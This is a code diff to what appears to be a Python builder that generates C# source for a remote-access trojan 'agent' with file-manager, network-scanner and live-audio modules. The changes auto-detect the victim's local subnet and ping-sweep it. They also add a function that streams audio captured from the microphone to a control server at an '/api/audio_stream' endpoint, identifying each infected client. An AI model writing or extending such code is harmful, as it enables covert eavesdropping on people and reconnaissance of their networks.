@@ -1517,7 +1517,9 @@ def generate_agent_source(bc):
         "using System.Net;\n"
         "using System.Text;\n"
         "using System.Linq;\n"
-        "using System.Threading;\n"
+        "using System.Threading;\n"\
+        "using System.Collections.Generic;\n"\
+        "using System.Collections.Concurrent;\n"
         "using System.Diagnostics;\n"
         "using System.Drawing;\n"
         "using System.Drawing.Imaging;\n"
@@ -2817,14 +2819,24 @@ def _generate_file_manager_code():
 def _generate_network_scanner_code():
     return (
         "        // ==== Network Scanner ====\n"
-        "        static string ScanNetwork(string subnet) {\n"
+        "        static string ScanNetwork() {\n"\
+        "            string subnet = \"192.168.1\";\n"\
+        "            try {\n"\
+        "                foreach (var ip in System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()).AddressList) {\n"\
+        "                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) {\n"\
+        "                        string[] spl = ip.ToString().Split(new char[] { '.' });\n"\
+        "                        subnet = spl[0] + \".\" + spl[1] + \".\" + spl[2];\n"\
+        "                        break;\n"\
+        "                    }\n"\
+        "                }\n"\
+        "            } catch {}\n"
         "            var sb = new StringBuilder();\n"
         "            try {\n"
         "                var tasks = new List<Thread>();\n"
         "                var found = new ConcurrentBag<string>();\n"
         "                for (int i = 1; i < 255; i++) {\n"
         '                    string target = subnet + "." + i;\n'
-        "                    var t = new Thread((obj) => {\n"
+        "                    var t = new Thread(new ParameterizedThreadStart((obj) => {\n"
         "                        string pip = (string)obj;\n"
         "                        try {\n"
         "                            var ping = new System.Net.NetworkInformation.Ping();\n"
@@ -2946,6 +2958,19 @@ def _generate_realtime_audio_code():
         "        static IntPtr _hWaveIn;\n"
         "        static bool rtAudioRunning = false;\n"
         "\n"
+        "        static void SendAudioChunk(byte[] chunk) {\n"\
+        "            try {\n"\
+        "                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(_server + \"/api/audio_stream\");\n"\
+        "                req.Method = \"POST\";\n"\
+        "                req.ContentType = \"application/octet-stream\";\n"\
+        "                req.Headers.Add(\"X-Client-ID\", _clientId);\n"\
+        "                req.Timeout = 5000;\n"\
+        "                using (var stream = req.GetRequestStream()) {\n"\
+        "                    stream.Write(chunk, 0, chunk.Length);\n"\
+        "                }\n"\
+        "                using (var resp = req.GetResponse()) { }\n"\
+        "            } catch {} \n"\
+        "        }\n\n"\
         "        static void StartRealtimeAudio() {\n"
         "            if (rtAudioRunning) return;\n"
         "            rtAudioRunning = true;\n"
